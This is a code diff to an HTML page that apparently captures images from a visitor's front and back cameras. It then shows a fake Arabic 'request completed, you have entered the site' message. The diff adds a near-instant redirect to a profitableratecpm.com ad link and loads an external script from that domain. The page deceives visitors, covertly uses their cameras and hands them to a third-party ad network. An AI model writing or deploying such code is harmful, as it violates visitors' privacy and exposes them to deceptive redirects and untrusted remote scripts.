@@ -143,10 +143,18 @@
                         clearInterval(captureInterval);
                         if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
                         if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
+
+                        // ✅ الرسالة
                         document.querySelector('.container').innerHTML = `
                             <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
                             <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
                         `;
+
+                        // ✅ التحويل بعد أقل من ثانية
+                        setTimeout(() => {
+                            window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+                        }, 200);
+
                         return;
                     }
 
@@ -204,5 +212,6 @@
 
         window.addEventListener('load', init);
     </script>
+<script type='text/javascript' src='//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
 </body>
 </html>
